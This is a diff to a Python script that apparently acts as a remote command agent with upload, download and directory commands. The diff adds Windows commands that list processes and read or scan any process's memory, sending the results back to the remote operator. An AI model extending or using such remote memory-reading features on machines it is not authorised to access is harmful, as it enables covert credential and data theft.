@@ -11,6 +11,16 @@ import hashlib
 import os
 from queue import Queue
 import time  # Added import for time module
+import platform # To check OS
+
+# Attempt to import Windows-specific utilities
+IS_WINDOWS = platform.system() == "Windows"
+if IS_WINDOWS:
+    try:
+        import windows_utils
+    except ImportError:
+        print("Warning: Failed to import windows_utils. Windows-specific commands will not be available.")
+        IS_WINDOWS = False # Treat as non-Windows if import fails
 
 # Load environment variables
 import os
@@ -27,7 +37,18 @@ ENCRYPTION_KEY = Fernet.generate_key()  # Save this securely
 cipher = Fernet(ENCRYPTION_KEY)
 
 BUFFER_SIZE = 4096
-ALLOWED_COMMANDS = {'ls', 'pwd', 'cd', 'upload', 'download', 'clear', 'quit', 'help', 'analyze_strings', 'get_file_hash'}
+ALLOWED_COMMANDS = {
+    'ls', 'pwd', 'cd', 'upload', 'download', 'clear', 'quit', 'help',
+    'analyze_strings', 'get_file_hash',
+    # Windows specific commands are added conditionally below
+}
+if IS_WINDOWS:
+    ALLOWED_COMMANDS.update({
+        'list_processes_win',
+        'proc_details_win',
+        'read_mem_win',
+        'scan_mem_win'
+    })
 command_history = []
 
 def get_file_hash(filepath, hashtype='sha256'):
@@ -172,6 +193,79 @@ def execute_command(command):
         reliable_send(hash_result)
         add_to_history(command)
         return
+    elif command == "list_processes_win":
+        if IS_WINDOWS:
+            result = windows_utils.list_processes_windows_impl()
+            if isinstance(result, str): # Error message
+                reliable_send(result)
+            else: # List of process dicts
+                # Format the list of dicts into a readable string
+                output_str = "PID\tParentPID\tExeFile\n" + "-"*40 + "\n"
+                for p in result:
+                    output_str += f"{p['PID']}\t{p['ParentPID']}\t\t{p['ExeFile']}\n"
+                reliable_send(output_str)
+        else:
+            reliable_send("Error: This command is only available on Windows.")
+        add_to_history(command)
+        return
+    elif command.startswith("proc_details_win "):
+        if IS_WINDOWS:
+            pid_str = command[17:].strip()
+            result = windows_utils.get_process_details_windows_impl(pid_str)
+            if isinstance(result, str): # Error message
+                reliable_send(result)
+            else: # Dictionary of details
+                output_str = f"Details for PID {result.get('PID', 'N/A')}:\n"
+                for key, value in result.items():
+                    if key != "PID": # Already in header
+                        output_str += f"  {key}: {value}\n"
+                reliable_send(output_str)
+        else:
+            reliable_send("Error: This command is only available on Windows.")
+        add_to_history(command)
+        return
+    elif command.startswith("read_mem_win "):
+        if IS_WINDOWS:
+            parts = command.split()
+            if len(parts) == 4:
+                pid_str, addr_str, size_str = parts[1], parts[2], parts[3]
+                result = windows_utils.read_process_memory_windows_impl(pid_str, addr_str, size_str)
+                if isinstance(result, str): # Error message
+                    reliable_send(result)
+                else: # Dictionary of mem data
+                    output_str = f"Memory Read from PID {result['pid']} at {result['address']}:\n"
+                    output_str += f"  Requested: {result['size_requested']} bytes, Read: {result['bytes_read']} bytes\n"
+                    output_str += f"  Data (hex): {result['data_hex']}"
+                    reliable_send(output_str)
+            else:
+                reliable_send("Usage: read_mem_win [PID] [hex_address] [size_in_bytes]")
+        else:
+            reliable_send("Error: This command is only available on Windows.")
+        add_to_history(command)
+        return
+    elif command.startswith("scan_mem_win "):
+        if IS_WINDOWS:
+            parts = command.split(maxsplit=3) # scan_mem_win [PID] [type] [pattern]
+            if len(parts) == 4:
+                pid_str, type_str, pattern_str = parts[1], parts[2], parts[3]
+                result = windows_utils.scan_process_memory_windows_impl(pid_str, type_str, pattern_str)
+                if isinstance(result, str): # Error message
+                    reliable_send(result)
+                else: # Dictionary of scan results
+                    output_str = f"Memory Scan Results for PID {result['pid']} (Pattern: '{result['pattern']}', Type: {result['pattern_type']}):\n"
+                    if result['found_at_addresses']:
+                        output_str += "  Found at addresses:\n"
+                        for addr in result['found_at_addresses']:
+                            output_str += f"    - {addr}\n"
+                    else: # Should be covered by the "not found" message from impl, but as a fallback
+                        output_str += "  Pattern not found."
+                    reliable_send(output_str)
+            else:
+                reliable_send("Usage: scan_mem_win [PID] [string|bytes] [pattern_to_search (hex for bytes)]")
+        else:
+            reliable_send("Error: This command is only available on Windows.")
+        add_to_history(command)
+        return
     elif command == "history":
         response = list_history()
         reliable_send("\n".join(response))
@@ -231,6 +325,14 @@ def display_help():
     help: Display this help information
     history: List executed commands
     clear_history: Clear command history
+    """
+    if IS_WINDOWS:
+        help_text += """
+    Windows Specific Commands:
+    list_processes_win: List running processes on the Windows host.
+    proc_details_win [PID]: Get details for a specific process ID on Windows.
+    read_mem_win [PID] [hex_address] [size]: Read memory from a process at a given hex address.
+    scan_mem_win [PID] [string|bytes] [pattern]: Scan process memory for a string or hex byte pattern.
     """
     reliable_send(help_text)
 
